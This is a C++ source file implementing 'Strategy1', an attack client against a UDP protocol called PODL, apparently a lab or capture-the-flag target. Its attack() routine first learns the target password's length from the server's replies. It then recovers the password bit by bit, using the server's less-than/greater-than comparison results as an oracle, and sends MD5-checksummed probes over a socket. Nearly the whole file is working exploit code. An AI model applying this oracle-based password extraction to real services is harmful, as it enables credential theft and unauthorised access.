#include <strategy1.h>
#include <string>
#include <openssl/md5.h>
#include <iostream>
#include <iomanip>
//#include <bitset>

extern "C"
{
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
}


Strategy1::Strategy1(int socket, struct sockaddr_in & servaddr)
: m_socket(socket)
, m_servaddr(servaddr)
{
}

void
Strategy1::dump(std::string caption, std::vector<unsigned char> & dump)
{
    std::cout << caption;
    for (std::vector<unsigned char>::iterator iter = dump.begin();
        iter != dump.end(); iter++)
    {
        std::cout << " " << std::hex << std::setw(2) << std::setfill('0')
            << (int)*iter;
    }
    std::cout << std::endl;
}

bool
Strategy1::attack(void)
{
    int passwordLength(0);
    std::vector<unsigned char> probeResult;
    PODLMessage message;

    // figure out how long the target password is. The server tells us by returning 1
    for (int ii = 1; ii < 256; ii++)
    {
        std::vector<unsigned char> attackPass(ii, 'x');
        buildMessage(&message, attackPass);
        if (false == probe(&message, &probeResult))
        {
            std::cout << "Network failure" << std::endl;
            return false;
        }
        if (1 != probeResult.size())
        {
            passwordLength = ii;
        }
    }

    std::cout << "Password length is " << passwordLength << std::endl;
    std::vector<unsigned char> probePassword(passwordLength, 79); // (126 - 32) / 2 + 32

    //
    // We're assuming the password is regular ASCII
    //
    std::vector<unsigned char> lexLess = { 1, 0 };
    std::vector<unsigned char> lexMore = { 1, 0xff };

    // Start out with an empty string and set the MSB. The rcode
    // from the server will give us guidance on how to set the next
    // bit until we match the password.
//    bool nextSet(true);
    for (int bitIndex = 0; bitIndex < (passwordLength * 8) -1; bitIndex++)
    {
        std::cout << "bitIndex " << bitIndex << std::endl;
        if (0x2b == bitIndex)
        {
            std::cout << "Now is the hour" << std::endl;
        }
        buildMessage(&message, probePassword);
        std::cout << "Probe password " << std::string(probePassword.begin(), probePassword.end()) << std::endl;
        if (false == probe(&message, &probeResult))
        {
            std::cout << "Network failure" << std::endl;
            return false;
        }
        int setByte(bitIndex / 8);
        int setBit(1 << (7 - (bitIndex % 8)));
        if (0x80 == setBit)
        {
            continue;
        }
        std::cout << "Setting byte " << setByte << " 0x"
            << std::hex << std::setw(2) << std::setfill('0')
            << setBit << std::endl;
        if (probeResult == lexLess)
        {
            probePassword[setByte] |= setBit;
        }
        else if (probeResult == lexMore)
        {
            probePassword[setByte] &= ~setBit;
        }
        else
        {
            break;
        }
    }

    std::cout << "Discovered password "
        << std::string(probePassword.begin(), probePassword.end())
        << std::endl;
    return true;
}

bool
Strategy1::probe(PODLMessage * msg, std::vector<unsigned char> * result)
{
    if (sendto(m_socket, (void *)msg,
        sizeof(msg->header) + msg->header.length + MD5_DIGEST_LENGTH,
        0, (struct sockaddr *)&m_servaddr, sizeof(m_servaddr)) < 0)
    {
        int errNo(errno);
        std::cout << "sendto fails " << (int)errNo << " "
            << strerror(errNo) << std::endl;
            return false;
    }
    std::cout << "Probe sent" << std::endl;

//    struct sockaddr_in servaddr = { 0 };
//    socklen_t len(sizeof(servaddr));

    char rxBuffer[1514];
    PODLMessage * rxMsg = (PODLMessage *)rxBuffer;

    fd_set fdReads;
    FD_ZERO(&fdReads);
    FD_SET (m_socket, &fdReads);

    struct timeval timeout { 30, 0 };
    int rc = select(m_socket + 1, &fdReads, NULL, NULL, &timeout);
    if (rc > 0)
    {
        if (FD_ISSET(m_socket, &fdReads))
        {
            int rxCount(recvfrom(m_socket, (void *)rxBuffer, 1512, 0, NULL, NULL));
            std::cout << "rxCount " << rxCount << " length " << (int)rxMsg->header.length << std::endl;
            result->assign(rxMsg->data, rxMsg->data + rxMsg->header.length);
            dump("probeResult", *result);
            return true;
        }
    }
    else
    {
        int errNo(errno);
        std::cout << "select failed " << errNo << " " << strerror(errNo) << std::endl;
        return false;
    }

#if 0
    char rxBuffer[1514];
    PODLMessage * rxMsg = (PODLMessage *)rxBuffer;
    int rxCount(recvfrom(m_socket, (void *)rxMsg, 
        sizeof(rxMsg->header), 
         0, NULL, NULL));
//        0, (struct sockaddr *)&servaddr, &len));
    if (rxCount < 0)
    {
        int errNo(errno);
        std::cout << "recvfrom 1 fails " << (int)errNo << " "
            << strerror(errNo) << std::endl;
        return false;
    }

    std::cout << "Got message header, payload "
        << rxMsg->header.length << "bytes" << std::endl;

    rxCount = recvfrom(m_socket, (void *)rxMsg->data, 
        rxMsg->header.length + MD5_DIGEST_LENGTH,
         0, NULL, NULL);
//        0, (struct sockaddr *)&servaddr, &len);

    std::cout << "rxCount " << rxCount << std::endl;
    if (rxCount < 0)
    {
        int errNo(errno);
        std::cout << "recvfrom 2 fails " << (int)errNo << " "
            << strerror(errNo) << std::endl;
            return false;
    }

    //
    // TODO validate server response
    // 
//    rxMsg = (PODLMessage *)rxBuffer;
    result->insert(result->begin(), rxMsg->data, 
        rxMsg->data + rxMsg->header.length);
#endif // 0
    return true;
}

void
Strategy1::buildMessage(PODLMessage * msg,
     std::vector<unsigned char> & payload)
{
    memcpy(msg->header.podl, "PODL", 4);
    msg->header.id = 0;
    msg->header.length = payload.size();
    memcpy(msg->data, payload.data(), payload.size());
    buildMd5Sum(msg);
}

void
Strategy1::buildMd5Sum(PODLMessage * message)
{
    unsigned char result[MD5_DIGEST_LENGTH];
    MD5((const unsigned char *)message,
        sizeof(message->header) + message->header.length, result);
    memcpy(message->data + message->header.length, result, MD5_DIGEST_LENGTH);
}

